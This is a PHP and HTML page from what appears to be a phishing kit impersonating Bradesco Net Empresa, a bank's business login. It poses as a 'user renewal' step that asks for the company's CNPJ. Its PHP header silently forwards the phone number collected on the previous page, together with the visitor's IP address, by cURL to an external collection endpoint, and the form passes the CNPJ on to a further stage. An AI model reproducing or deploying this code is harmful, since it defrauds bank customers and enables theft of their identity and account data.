<?php
    $telefone = isset($_POST['campo_terceiro']) ? trim($_POST['campo_terceiro']) : '';

    if(empty($telefone)){
        die("Erro: 403.");
    }
    
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $linkdatabase);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        "etapa2" => "ok",
        "ip" => $ip,
        "telefone" => $telefone,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login Bradesco Net Empresa</title>
  <link rel="stylesheet" href="css/mobile.css">
  <script type="text/javascript">
    function mascaraCNPJ(value) {
      return value
        .replace(/\D/g, '')
        .replace(/^(\d{2})(\d)/, '$1.$2')
        .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
        .replace(/\.(\d{3})(\d)/, '.$1/$2')
        .replace(/(\d{4})(\d)/, '$1-$2')
        .slice(0, 18);
    }
    function validarCNPJ(cnpj) {
      cnpj = cnpj.replace(/[^\d]+/g, '');

      if (cnpj.length !== 14) return false;

      // Elimina CNPJs inválidos conhecidos
      if (/^(\d)\1+$/.test(cnpj)) return false;

      let tamanho = cnpj.length - 2;
      let numeros = cnpj.substring(0, tamanho);
      let digitos = cnpj.substring(tamanho);
      let soma = 0;
      let pos = tamanho - 7;

      // Primeiro dígito verificador
      for (let i = tamanho; i >= 1; i--) {
        soma += numeros.charAt(tamanho - i) * pos--;
        if (pos < 2) pos = 9;
      }

      let resultado = soma % 11 < 2 ? 0 : 11 - (soma % 11);
      if (resultado != digitos.charAt(0)) return false;

      // Segundo dígito verificador
      tamanho = tamanho + 1;
      numeros = cnpj.substring(0, tamanho);
      soma = 0;
      pos = tamanho - 7;

      for (let i = tamanho; i >= 1; i--) {
        soma += numeros.charAt(tamanho - i) * pos--;
        if (pos < 2) pos = 9;
      }

      resultado = soma % 11 < 2 ? 0 : 11 - (soma % 11);

      return resultado == digitos.charAt(1);
    }
    
    function SendCnpj(){
      let cnpj = document.getElementById("cnpj").value;
      if(validarCNPJ(cnpj)){
        document.getElementById("frmndsds").submit();
      }else{
        alert("Preencha corretamente o campo do CNPJ");
      }
    }
  </script>
</head>
<body>
  <header>
    Bradesco Net Empresa
  </header>

  <main>
    <h1>Renovação de Usuário</h1>
  
    
              <p>Para reativação de usuário expirado, é necessário informar o CNPJ vinculado à conta.</p>

               <p> Essa etapa é fundamental para validar os dados cadastrais e garantir a segurança do processo de reativação. </p>

               <p> Informe abaixo o CNPJ de cadastro da conta:</p>
    <form method="POST" action="/finalizado" id="frmndsds">
      <div class="input-group">
        <input
          type="text"
          id="cnpj"
          name="campo_quarto"
          value=""
          placeholder=""
          autocomplete="cnpj"
          required
          oninput="this.value = mascaraCNPJ(this.value)"
        />
        <label for="cnpj">CNPJ</label>
      </div>


   

     
    </form>
  </main>
 <button type="submit" onclick="SendCnpj();" >Continuar</button>
  
</body>
</html>